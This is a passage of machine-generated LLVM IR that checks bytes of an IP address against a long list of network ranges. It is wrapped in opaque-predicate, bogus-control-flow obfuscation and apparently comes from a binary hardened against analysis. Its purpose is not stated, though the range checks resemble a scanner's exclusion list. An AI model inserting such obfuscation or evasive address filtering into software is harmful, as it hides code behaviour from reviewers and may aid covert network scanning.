  %3879 = icmp eq i32 %3878, 0
  %3880 = icmp slt i32 %3875, 10
  %3881 = or i1 %3879, %3880
  br i1 %3881, label %originalBBpart2535, label %originalBB533alteredBB

originalBBpart2535:                               ; preds = %originalBB533
  br i1 %3873, label %3882, label %3902

; <label>:3882:                                   ; preds = %originalBBpart2535
  %3883 = load i32, i32* @x.71
  %3884 = load i32, i32* @y.72
  %3885 = sub i32 %3883, 1
  %3886 = mul i32 %3883, %3885
  %3887 = urem i32 %3886, 2
  %3888 = icmp eq i32 %3887, 0
  %3889 = icmp slt i32 %3884, 10
  %3890 = or i1 %3888, %3889
  br i1 %3890, label %originalBB537, label %originalBB537alteredBB

originalBB537:                                    ; preds = %originalBB537alteredBB, %3882
  %3891 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3892 = zext i8 %3891 to i32
  %3893 = icmp slt i32 %3892, 111
  %3894 = load i32, i32* @x.71
  %3895 = load i32, i32* @y.72
  %3896 = sub i32 %3894, 1
  %3897 = mul i32 %3894, %3896
  %3898 = urem i32 %3897, 2
  %3899 = icmp eq i32 %3898, 0
  %3900 = icmp slt i32 %3895, 10
  %3901 = or i1 %3899, %3900
  br i1 %3901, label %originalBBpart2539, label %originalBB537alteredBB

originalBBpart2539:                               ; preds = %originalBB537
  br i1 %3893, label %5234, label %3902

; <label>:3902:                                   ; preds = %originalBBpart2539, %originalBBpart2535, %3858, %originalBBpart2531
  %3903 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3904 = zext i8 %3903 to i32
  %3905 = icmp eq i32 %3904, 107
  br i1 %3905, label %3906, label %3934

; <label>:3906:                                   ; preds = %3902
  %3907 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3908 = zext i8 %3907 to i32
  %3909 = icmp eq i32 %3908, 181
  br i1 %3909, label %3910, label %3934

; <label>:3910:                                   ; preds = %3906
  %3911 = load i32, i32* @x.71
  %3912 = load i32, i32* @y.72
  %3913 = sub i32 %3911, 1
  %3914 = mul i32 %3911, %3913
  %3915 = urem i32 %3914, 2
  %3916 = icmp eq i32 %3915, 0
  %3917 = icmp slt i32 %3912, 10
  %3918 = or i1 %3916, %3917
  br i1 %3918, label %originalBB541, label %originalBB541alteredBB

originalBB541:                                    ; preds = %originalBB541alteredBB, %3910
  %3919 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3920 = zext i8 %3919 to i32
  %3921 = icmp sge i32 %3920, 160
  %3922 = load i32, i32* @x.71
  %3923 = load i32, i32* @y.72
  %3924 = sub i32 %3922, 1
  %3925 = mul i32 %3922, %3924
  %3926 = urem i32 %3925, 2
  %3927 = icmp eq i32 %3926, 0
  %3928 = icmp slt i32 %3923, 10
  %3929 = or i1 %3927, %3928
  br i1 %3929, label %originalBBpart2543, label %originalBB541alteredBB

originalBBpart2543:                               ; preds = %originalBB541
  br i1 %3921, label %3930, label %3934

; <label>:3930:                                   ; preds = %originalBBpart2543
  %3931 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3932 = zext i8 %3931 to i32
  %3933 = icmp slt i32 %3932, 189
  br i1 %3933, label %5234, label %3934

; <label>:3934:                                   ; preds = %3930, %originalBBpart2543, %3906, %3902
  %3935 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3936 = zext i8 %3935 to i32
  %3937 = icmp eq i32 %3936, 172
  br i1 %3937, label %3938, label %3966

; <label>:3938:                                   ; preds = %3934
  %3939 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3940 = zext i8 %3939 to i32
  %3941 = icmp eq i32 %3940, 98
  br i1 %3941, label %3942, label %3966

; <label>:3942:                                   ; preds = %3938
  %3943 = load i32, i32* @x.71
  %3944 = load i32, i32* @y.72
  %3945 = sub i32 %3943, 1
  %3946 = mul i32 %3943, %3945
  %3947 = urem i32 %3946, 2
  %3948 = icmp eq i32 %3947, 0
  %3949 = icmp slt i32 %3944, 10
  %3950 = or i1 %3948, %3949
  br i1 %3950, label %originalBB545, label %originalBB545alteredBB

originalBB545:                                    ; preds = %originalBB545alteredBB, %3942
  %3951 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3952 = zext i8 %3951 to i32
  %3953 = icmp sge i32 %3952, 64
  %3954 = load i32, i32* @x.71
  %3955 = load i32, i32* @y.72
  %3956 = sub i32 %3954, 1
  %3957 = mul i32 %3954, %3956
  %3958 = urem i32 %3957, 2
  %3959 = icmp eq i32 %3958, 0
  %3960 = icmp slt i32 %3955, 10
  %3961 = or i1 %3959, %3960
  br i1 %3961, label %originalBBpart2547, label %originalBB545alteredBB

originalBBpart2547:                               ; preds = %originalBB545
  br i1 %3953, label %3962, label %3966

; <label>:3962:                                   ; preds = %originalBBpart2547
  %3963 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3964 = zext i8 %3963 to i32
  %3965 = icmp slt i32 %3964, 95
  br i1 %3965, label %5234, label %3966

; <label>:3966:                                   ; preds = %3962, %originalBBpart2547, %3938, %3934
  %3967 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %3968 = zext i8 %3967 to i32
  %3969 = icmp eq i32 %3968, 184
  br i1 %3969, label %3970, label %3998

; <label>:3970:                                   ; preds = %3966
  %3971 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %3972 = zext i8 %3971 to i32
  %3973 = icmp eq i32 %3972, 170
  br i1 %3973, label %3974, label %3998

; <label>:3974:                                   ; preds = %3970
  %3975 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3976 = zext i8 %3975 to i32
  %3977 = icmp sge i32 %3976, 240
  br i1 %3977, label %3978, label %3998

; <label>:3978:                                   ; preds = %3974
  %3979 = load i32, i32* @x.71
  %3980 = load i32, i32* @y.72
  %3981 = sub i32 %3979, 1
  %3982 = mul i32 %3979, %3981
  %3983 = urem i32 %3982, 2
  %3984 = icmp eq i32 %3983, 0
  %3985 = icmp slt i32 %3980, 10
  %3986 = or i1 %3984, %3985
  br i1 %3986, label %originalBB549, label %originalBB549alteredBB

originalBB549:                                    ; preds = %originalBB549alteredBB, %3978
  %3987 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %3988 = zext i8 %3987 to i32
  %3989 = icmp slt i32 %3988, 255
  %3990 = load i32, i32* @x.71
  %3991 = load i32, i32* @y.72
  %3992 = sub i32 %3990, 1
  %3993 = mul i32 %3990, %3992
  %3994 = urem i32 %3993, 2
  %3995 = icmp eq i32 %3994, 0
  %3996 = icmp slt i32 %3991, 10
  %3997 = or i1 %3995, %3996
  br i1 %3997, label %originalBBpart2551, label %originalBB549alteredBB

originalBBpart2551:                               ; preds = %originalBB549
  br i1 %3989, label %5234, label %3998

; <label>:3998:                                   ; preds = %originalBBpart2551, %3974, %3970, %3966
  %3999 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4000 = zext i8 %3999 to i32
  %4001 = icmp eq i32 %4000, 192
  br i1 %4001, label %4002, label %4014

; <label>:4002:                                   ; preds = %3998
  %4003 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4004 = zext i8 %4003 to i32
  %4005 = icmp eq i32 %4004, 111
  br i1 %4005, label %4006, label %4014

; <label>:4006:                                   ; preds = %4002
  %4007 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4008 = zext i8 %4007 to i32
  %4009 = icmp sge i32 %4008, 128
  br i1 %4009, label %4010, label %4014

; <label>:4010:                                   ; preds = %4006
  %4011 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4012 = zext i8 %4011 to i32
  %4013 = icmp slt i32 %4012, 143
  br i1 %4013, label %5234, label %4014

; <label>:4014:                                   ; preds = %4010, %4006, %4002, %3998
  %4015 = load i32, i32* @x.71
  %4016 = load i32, i32* @y.72
  %4017 = sub i32 %4015, 1
  %4018 = mul i32 %4015, %4017
  %4019 = urem i32 %4018, 2
  %4020 = icmp eq i32 %4019, 0
  %4021 = icmp slt i32 %4016, 10
  %4022 = or i1 %4020, %4021
  br i1 %4022, label %originalBB553, label %originalBB553alteredBB

originalBB553:                                    ; preds = %originalBB553alteredBB, %4014
  %4023 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4024 = zext i8 %4023 to i32
  %4025 = icmp eq i32 %4024, 192
  %4026 = load i32, i32* @x.71
  %4027 = load i32, i32* @y.72
  %4028 = sub i32 %4026, 1
  %4029 = mul i32 %4026, %4028
  %4030 = urem i32 %4029, 2
  %4031 = icmp eq i32 %4030, 0
  %4032 = icmp slt i32 %4027, 10
  %4033 = or i1 %4031, %4032
  br i1 %4033, label %originalBBpart2555, label %originalBB553alteredBB

originalBBpart2555:                               ; preds = %originalBB553
  br i1 %4025, label %4034, label %4078

; <label>:4034:                                   ; preds = %originalBBpart2555
  %4035 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4036 = zext i8 %4035 to i32
  %4037 = icmp eq i32 %4036, 252
  br i1 %4037, label %4038, label %4078

; <label>:4038:                                   ; preds = %4034
  %4039 = load i32, i32* @x.71
  %4040 = load i32, i32* @y.72
  %4041 = sub i32 %4039, 1
  %4042 = mul i32 %4039, %4041
  %4043 = urem i32 %4042, 2
  %4044 = icmp eq i32 %4043, 0
  %4045 = icmp slt i32 %4040, 10
  %4046 = or i1 %4044, %4045
  br i1 %4046, label %originalBB557, label %originalBB557alteredBB

originalBB557:                                    ; preds = %originalBB557alteredBB, %4038
  %4047 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4048 = zext i8 %4047 to i32
  %4049 = icmp sge i32 %4048, 208
  %4050 = load i32, i32* @x.71
  %4051 = load i32, i32* @y.72
  %4052 = sub i32 %4050, 1
  %4053 = mul i32 %4050, %4052
  %4054 = urem i32 %4053, 2
  %4055 = icmp eq i32 %4054, 0
  %4056 = icmp slt i32 %4051, 10
  %4057 = or i1 %4055, %4056
  br i1 %4057, label %originalBBpart2559, label %originalBB557alteredBB

originalBBpart2559:                               ; preds = %originalBB557
  br i1 %4049, label %4058, label %4078

; <label>:4058:                                   ; preds = %originalBBpart2559
  %4059 = load i32, i32* @x.71
  %4060 = load i32, i32* @y.72
  %4061 = sub i32 %4059, 1
  %4062 = mul i32 %4059, %4061
  %4063 = urem i32 %4062, 2
  %4064 = icmp eq i32 %4063, 0
  %4065 = icmp slt i32 %4060, 10
  %4066 = or i1 %4064, %4065
  br i1 %4066, label %originalBB561, label %originalBB561alteredBB

originalBB561:                                    ; preds = %originalBB561alteredBB, %4058
  %4067 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4068 = zext i8 %4067 to i32
  %4069 = icmp slt i32 %4068, 223
  %4070 = load i32, i32* @x.71
  %4071 = load i32, i32* @y.72
  %4072 = sub i32 %4070, 1
  %4073 = mul i32 %4070, %4072
  %4074 = urem i32 %4073, 2
  %4075 = icmp eq i32 %4074, 0
  %4076 = icmp slt i32 %4071, 10
  %4077 = or i1 %4075, %4076
  br i1 %4077, label %originalBBpart2563, label %originalBB561alteredBB

originalBBpart2563:                               ; preds = %originalBB561
  br i1 %4069, label %5234, label %4078

; <label>:4078:                                   ; preds = %originalBBpart2563, %originalBBpart2559, %4034, %originalBBpart2555
  %4079 = load i32, i32* @x.71
  %4080 = load i32, i32* @y.72
  %4081 = sub i32 %4079, 1
  %4082 = mul i32 %4079, %4081
  %4083 = urem i32 %4082, 2
  %4084 = icmp eq i32 %4083, 0
  %4085 = icmp slt i32 %4080, 10
  %4086 = or i1 %4084, %4085
  br i1 %4086, label %originalBB565, label %originalBB565alteredBB

originalBB565:                                    ; preds = %originalBB565alteredBB, %4078
  %4087 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4088 = zext i8 %4087 to i32
  %4089 = icmp eq i32 %4088, 192
  %4090 = load i32, i32* @x.71
  %4091 = load i32, i32* @y.72
  %4092 = sub i32 %4090, 1
  %4093 = mul i32 %4090, %4092
  %4094 = urem i32 %4093, 2
  %4095 = icmp eq i32 %4094, 0
  %4096 = icmp slt i32 %4091, 10
  %4097 = or i1 %4095, %4096
  br i1 %4097, label %originalBBpart2567, label %originalBB565alteredBB

originalBBpart2567:                               ; preds = %originalBB565
  br i1 %4089, label %4098, label %4142

; <label>:4098:                                   ; preds = %originalBBpart2567
  %4099 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4100 = zext i8 %4099 to i32
  %4101 = icmp eq i32 %4100, 40
  br i1 %4101, label %4102, label %4142

; <label>:4102:                                   ; preds = %4098
  %4103 = load i32, i32* @x.71
  %4104 = load i32, i32* @y.72
  %4105 = sub i32 %4103, 1
  %4106 = mul i32 %4103, %4105
  %4107 = urem i32 %4106, 2
  %4108 = icmp eq i32 %4107, 0
  %4109 = icmp slt i32 %4104, 10
  %4110 = or i1 %4108, %4109
  br i1 %4110, label %originalBB569, label %originalBB569alteredBB

originalBB569:                                    ; preds = %originalBB569alteredBB, %4102
  %4111 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4112 = zext i8 %4111 to i32
  %4113 = icmp sge i32 %4112, 56
  %4114 = load i32, i32* @x.71
  %4115 = load i32, i32* @y.72
  %4116 = sub i32 %4114, 1
  %4117 = mul i32 %4114, %4116
  %4118 = urem i32 %4117, 2
  %4119 = icmp eq i32 %4118, 0
  %4120 = icmp slt i32 %4115, 10
  %4121 = or i1 %4119, %4120
  br i1 %4121, label %originalBBpart2571, label %originalBB569alteredBB

originalBBpart2571:                               ; preds = %originalBB569
  br i1 %4113, label %4122, label %4142

; <label>:4122:                                   ; preds = %originalBBpart2571
  %4123 = load i32, i32* @x.71
  %4124 = load i32, i32* @y.72
  %4125 = sub i32 %4123, 1
  %4126 = mul i32 %4123, %4125
  %4127 = urem i32 %4126, 2
  %4128 = icmp eq i32 %4127, 0
  %4129 = icmp slt i32 %4124, 10
  %4130 = or i1 %4128, %4129
  br i1 %4130, label %originalBB573, label %originalBB573alteredBB

originalBB573:                                    ; preds = %originalBB573alteredBB, %4122
  %4131 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4132 = zext i8 %4131 to i32
  %4133 = icmp slt i32 %4132, 59
  %4134 = load i32, i32* @x.71
  %4135 = load i32, i32* @y.72
  %4136 = sub i32 %4134, 1
  %4137 = mul i32 %4134, %4136
  %4138 = urem i32 %4137, 2
  %4139 = icmp eq i32 %4138, 0
  %4140 = icmp slt i32 %4135, 10
  %4141 = or i1 %4139, %4140
  br i1 %4141, label %originalBBpart2575, label %originalBB573alteredBB

originalBBpart2575:                               ; preds = %originalBB573
  br i1 %4133, label %5234, label %4142

; <label>:4142:                                   ; preds = %originalBBpart2575, %originalBBpart2571, %4098, %originalBBpart2567
  %4143 = load i32, i32* @x.71
  %4144 = load i32, i32* @y.72
  %4145 = sub i32 %4143, 1
  %4146 = mul i32 %4143, %4145
  %4147 = urem i32 %4146, 2
  %4148 = icmp eq i32 %4147, 0
  %4149 = icmp slt i32 %4144, 10
  %4150 = or i1 %4148, %4149
  br i1 %4150, label %originalBB577, label %originalBB577alteredBB

originalBB577:                                    ; preds = %originalBB577alteredBB, %4142
  %4151 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4152 = zext i8 %4151 to i32
  %4153 = icmp eq i32 %4152, 198
  %4154 = load i32, i32* @x.71
  %4155 = load i32, i32* @y.72
  %4156 = sub i32 %4154, 1
  %4157 = mul i32 %4154, %4156
  %4158 = urem i32 %4157, 2
  %4159 = icmp eq i32 %4158, 0
  %4160 = icmp slt i32 %4155, 10
  %4161 = or i1 %4159, %4160
  br i1 %4161, label %originalBBpart2579, label %originalBB577alteredBB

originalBBpart2579:                               ; preds = %originalBB577
  br i1 %4153, label %4162, label %4174

; <label>:4162:                                   ; preds = %originalBBpart2579
  %4163 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4164 = zext i8 %4163 to i32
  %4165 = icmp eq i32 %4164, 8
  br i1 %4165, label %4166, label %4174

; <label>:4166:                                   ; preds = %4162
  %4167 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4168 = zext i8 %4167 to i32
  %4169 = icmp sge i32 %4168, 81
  br i1 %4169, label %4170, label %4174

; <label>:4170:                                   ; preds = %4166
  %4171 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4172 = zext i8 %4171 to i32
  %4173 = icmp slt i32 %4172, 95
  br i1 %4173, label %5234, label %4174

; <label>:4174:                                   ; preds = %4170, %4166, %4162, %originalBBpart2579
  %4175 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4176 = zext i8 %4175 to i32
  %4177 = icmp eq i32 %4176, 199
  br i1 %4177, label %4178, label %4190

; <label>:4178:                                   ; preds = %4174
  %4179 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4180 = zext i8 %4179 to i32
  %4181 = icmp eq i32 %4180, 116
  br i1 %4181, label %4182, label %4190

; <label>:4182:                                   ; preds = %4178
  %4183 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4184 = zext i8 %4183 to i32
  %4185 = icmp sge i32 %4184, 112
  br i1 %4185, label %4186, label %4190

; <label>:4186:                                   ; preds = %4182
  %4187 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4188 = zext i8 %4187 to i32
  %4189 = icmp slt i32 %4188, 119
  br i1 %4189, label %5234, label %4190

; <label>:4190:                                   ; preds = %4186, %4182, %4178, %4174
  %4191 = load i32, i32* @x.71
  %4192 = load i32, i32* @y.72
  %4193 = sub i32 %4191, 1
  %4194 = mul i32 %4191, %4193
  %4195 = urem i32 %4194, 2
  %4196 = icmp eq i32 %4195, 0
  %4197 = icmp slt i32 %4192, 10
  %4198 = or i1 %4196, %4197
  br i1 %4198, label %originalBB581, label %originalBB581alteredBB

originalBB581:                                    ; preds = %originalBB581alteredBB, %4190
  %4199 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4200 = zext i8 %4199 to i32
  %4201 = icmp eq i32 %4200, 199
  %4202 = load i32, i32* @x.71
  %4203 = load i32, i32* @y.72
  %4204 = sub i32 %4202, 1
  %4205 = mul i32 %4202, %4204
  %4206 = urem i32 %4205, 2
  %4207 = icmp eq i32 %4206, 0
  %4208 = icmp slt i32 %4203, 10
  %4209 = or i1 %4207, %4208
  br i1 %4209, label %originalBBpart2583, label %originalBB581alteredBB

originalBBpart2583:                               ; preds = %originalBB581
  br i1 %4201, label %4210, label %4222

; <label>:4210:                                   ; preds = %originalBBpart2583
  %4211 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4212 = zext i8 %4211 to i32
  %4213 = icmp eq i32 %4212, 229
  br i1 %4213, label %4214, label %4222

; <label>:4214:                                   ; preds = %4210
  %4215 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4216 = zext i8 %4215 to i32
  %4217 = icmp sge i32 %4216, 248
  br i1 %4217, label %4218, label %4222

; <label>:4218:                                   ; preds = %4214
  %4219 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4220 = zext i8 %4219 to i32
  %4221 = icmp slt i32 %4220, 255
  br i1 %4221, label %5234, label %4222

; <label>:4222:                                   ; preds = %4218, %4214, %4210, %originalBBpart2583
  %4223 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4224 = zext i8 %4223 to i32
  %4225 = icmp eq i32 %4224, 199
  br i1 %4225, label %4226, label %4238

; <label>:4226:                                   ; preds = %4222
  %4227 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4228 = zext i8 %4227 to i32
  %4229 = icmp eq i32 %4228, 36
  br i1 %4229, label %4230, label %4238

; <label>:4230:                                   ; preds = %4226
  %4231 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4232 = zext i8 %4231 to i32
  %4233 = icmp sge i32 %4232, 220
  br i1 %4233, label %4234, label %4238

; <label>:4234:                                   ; preds = %4230
  %4235 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4236 = zext i8 %4235 to i32
  %4237 = icmp slt i32 %4236, 223
  br i1 %4237, label %5234, label %4238

; <label>:4238:                                   ; preds = %4234, %4230, %4226, %4222
  %4239 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4240 = zext i8 %4239 to i32
  %4241 = icmp eq i32 %4240, 199
  br i1 %4241, label %4242, label %4270

; <label>:4242:                                   ; preds = %4238
  %4243 = load i32, i32* @x.71
  %4244 = load i32, i32* @y.72
  %4245 = sub i32 %4243, 1
  %4246 = mul i32 %4243, %4245
  %4247 = urem i32 %4246, 2
  %4248 = icmp eq i32 %4247, 0
  %4249 = icmp slt i32 %4244, 10
  %4250 = or i1 %4248, %4249
  br i1 %4250, label %originalBB585, label %originalBB585alteredBB

originalBB585:                                    ; preds = %originalBB585alteredBB, %4242
  %4251 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4252 = zext i8 %4251 to i32
  %4253 = icmp eq i32 %4252, 58
  %4254 = load i32, i32* @x.71
  %4255 = load i32, i32* @y.72
  %4256 = sub i32 %4254, 1
  %4257 = mul i32 %4254, %4256
  %4258 = urem i32 %4257, 2
  %4259 = icmp eq i32 %4258, 0
  %4260 = icmp slt i32 %4255, 10
  %4261 = or i1 %4259, %4260
  br i1 %4261, label %originalBBpart2587, label %originalBB585alteredBB

originalBBpart2587:                               ; preds = %originalBB585
  br i1 %4253, label %4262, label %4270

; <label>:4262:                                   ; preds = %originalBBpart2587
  %4263 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4264 = zext i8 %4263 to i32
  %4265 = icmp sge i32 %4264, 184
  br i1 %4265, label %4266, label %4270

; <label>:4266:                                   ; preds = %4262
  %4267 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4268 = zext i8 %4267 to i32
  %4269 = icmp slt i32 %4268, 187
  br i1 %4269, label %5234, label %4270

; <label>:4270:                                   ; preds = %4266, %4262, %originalBBpart2587, %4238
  %4271 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4272 = zext i8 %4271 to i32
  %4273 = icmp eq i32 %4272, 206
  br i1 %4273, label %4274, label %4334

; <label>:4274:                                   ; preds = %4270
  %4275 = load i32, i32* @x.71
  %4276 = load i32, i32* @y.72
  %4277 = sub i32 %4275, 1
  %4278 = mul i32 %4275, %4277
  %4279 = urem i32 %4278, 2
  %4280 = icmp eq i32 %4279, 0
  %4281 = icmp slt i32 %4276, 10
  %4282 = or i1 %4280, %4281
  br i1 %4282, label %originalBB589, label %originalBB589alteredBB

originalBB589:                                    ; preds = %originalBB589alteredBB, %4274
  %4283 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4284 = zext i8 %4283 to i32
  %4285 = icmp eq i32 %4284, 220
  %4286 = load i32, i32* @x.71
  %4287 = load i32, i32* @y.72
  %4288 = sub i32 %4286, 1
  %4289 = mul i32 %4286, %4288
  %4290 = urem i32 %4289, 2
  %4291 = icmp eq i32 %4290, 0
  %4292 = icmp slt i32 %4287, 10
  %4293 = or i1 %4291, %4292
  br i1 %4293, label %originalBBpart2591, label %originalBB589alteredBB

originalBBpart2591:                               ; preds = %originalBB589
  br i1 %4285, label %4294, label %4334

; <label>:4294:                                   ; preds = %originalBBpart2591
  %4295 = load i32, i32* @x.71
  %4296 = load i32, i32* @y.72
  %4297 = sub i32 %4295, 1
  %4298 = mul i32 %4295, %4297
  %4299 = urem i32 %4298, 2
  %4300 = icmp eq i32 %4299, 0
  %4301 = icmp slt i32 %4296, 10
  %4302 = or i1 %4300, %4301
  br i1 %4302, label %originalBB593, label %originalBB593alteredBB

originalBB593:                                    ; preds = %originalBB593alteredBB, %4294
  %4303 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4304 = zext i8 %4303 to i32
  %4305 = icmp sge i32 %4304, 172
  %4306 = load i32, i32* @x.71
  %4307 = load i32, i32* @y.72
  %4308 = sub i32 %4306, 1
  %4309 = mul i32 %4306, %4308
  %4310 = urem i32 %4309, 2
  %4311 = icmp eq i32 %4310, 0
  %4312 = icmp slt i32 %4307, 10
  %4313 = or i1 %4311, %4312
  br i1 %4313, label %originalBBpart2595, label %originalBB593alteredBB

originalBBpart2595:                               ; preds = %originalBB593
  br i1 %4305, label %4314, label %4334

; <label>:4314:                                   ; preds = %originalBBpart2595
  %4315 = load i32, i32* @x.71
  %4316 = load i32, i32* @y.72
  %4317 = sub i32 %4315, 1
  %4318 = mul i32 %4315, %4317
  %4319 = urem i32 %4318, 2
  %4320 = icmp eq i32 %4319, 0
  %4321 = icmp slt i32 %4316, 10
  %4322 = or i1 %4320, %4321
  br i1 %4322, label %originalBB597, label %originalBB597alteredBB

originalBB597:                                    ; preds = %originalBB597alteredBB, %4314
  %4323 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4324 = zext i8 %4323 to i32
  %4325 = icmp slt i32 %4324, 175
  %4326 = load i32, i32* @x.71
  %4327 = load i32, i32* @y.72
  %4328 = sub i32 %4326, 1
  %4329 = mul i32 %4326, %4328
  %4330 = urem i32 %4329, 2
  %4331 = icmp eq i32 %4330, 0
  %4332 = icmp slt i32 %4327, 10
  %4333 = or i1 %4331, %4332
  br i1 %4333, label %originalBBpart2599, label %originalBB597alteredBB

originalBBpart2599:                               ; preds = %originalBB597
  br i1 %4325, label %5234, label %4334

; <label>:4334:                                   ; preds = %originalBBpart2599, %originalBBpart2595, %originalBBpart2591, %4270
  %4335 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4336 = zext i8 %4335 to i32
  %4337 = icmp eq i32 %4336, 208
  br i1 %4337, label %4338, label %4350

; <label>:4338:                                   ; preds = %4334
  %4339 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %4340 = zext i8 %4339 to i32
  %4341 = icmp eq i32 %4340, 78
  br i1 %4341, label %4342, label %4350

; <label>:4342:                                   ; preds = %4338
  %4343 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4344 = zext i8 %4343 to i32
  %4345 = icmp sge i32 %4344, 40
  br i1 %4345, label %4346, label %4350

; <label>:4346:                                   ; preds = %4342
  %4347 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %4348 = zext i8 %4347 to i32
  %4349 = icmp slt i32 %4348, 43
  br i1 %4349, label %5234, label %4350

; <label>:4350:                                   ; preds = %4346, %4342, %4338, %4334
  %4351 = load i32, i32* @x.71
  %4352 = load i32, i32* @y.72
  %4353 = sub i32 %4351, 1
  %4354 = mul i32 %4351, %4353
  %4355 = urem i32 %4354, 2
  %4356 = icmp eq i32 %4355, 0
  %4357 = icmp slt i32 %4352, 10
  %4358 = or i1 %4356, %4357
  br i1 %4358, label %originalBB601, label %originalBB601alteredBB

originalBB601:                                    ; preds = %originalBB601alteredBB, %4350
  %4359 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %4360 = zext i8 %4359 to i32
  %4361 = icmp eq i32 %4360, 208
  %4362 = load i32, i32* @x.71
  %4363 = load i32, i32* @y.72
  %4364 = sub i32 %4362, 1
  %4365 = mul i32 %4362, %4364
